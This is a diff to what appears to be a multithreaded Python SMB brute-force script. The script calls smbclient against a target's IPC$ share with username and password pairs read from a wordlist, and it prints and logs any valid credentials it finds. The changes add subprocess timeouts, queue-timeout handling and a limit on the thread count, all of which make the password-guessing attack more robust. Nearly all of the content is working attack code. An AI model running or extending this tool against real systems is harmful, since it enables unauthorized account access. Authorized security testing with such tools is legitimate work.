@@ -17,13 +17,21 @@ signal.signal(signal.SIGINT, signal_handler)
 def try_login(ip, username, password):
     print(Fore.CYAN + f"[*] Trying: {username}:{password}" + Style.RESET_ALL)
     cmd = ["smbclient", f"//{ip}/IPC$", "-U", f"{username}%{password}", "-m", "NT1"]
-    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    return result.returncode == 0
+    try:
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
+        return result.returncode == 0
+    except subprocess.TimeoutExpired:
+        print(Fore.YELLOW + f"[!] Timeout on: {username}:{password}" + Style.RESET_ALL)
+        return False
 
 # Worker thread function
 def worker(ip, combo_queue, result_holder, stop_flag):
     while not combo_queue.empty() and not stop_flag["found"]:
-        username, password = combo_queue.get()
+        try:
+            username, password = combo_queue.get(timeout=1)
+        except queue.Empty:
+            return
+
         if try_login(ip, username, password):
             print(Fore.GREEN + f"[+] Found Valid Credentials: {username}:{password}" + Style.RESET_ALL)
             log_result(ip, username, password, "Success")
@@ -44,8 +52,12 @@ def run_brute_force(ip, wordlist_path, threads):
                 if len(parts) == 2:
                     combo_queue.put(parts)
 
+    # Use threads only as needed
+    real_thread_count = min(threads, combo_queue.qsize())
+    print(Fore.MAGENTA + f"[DEBUG] Loaded {combo_queue.qsize()} combos | Starting {real_thread_count} threads" + Style.RESET_ALL)
+
     thread_list = []
-    for _ in range(threads):
+    for _ in range(real_thread_count):
         t = threading.Thread(target=worker, args=(ip, combo_queue, result_holder, stop_flag))
         t.start()
         thread_list.append(t)
